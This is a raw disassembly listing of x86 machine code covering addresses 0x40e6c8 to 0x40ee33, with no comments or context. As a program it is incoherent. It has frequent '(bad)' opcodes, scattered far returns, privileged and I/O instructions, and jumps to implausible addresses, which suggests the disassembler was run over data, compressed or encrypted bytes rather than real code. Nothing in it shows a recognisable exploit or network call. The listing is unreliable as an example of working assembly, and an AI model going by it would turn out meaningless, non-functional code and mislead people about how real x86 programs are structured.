  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
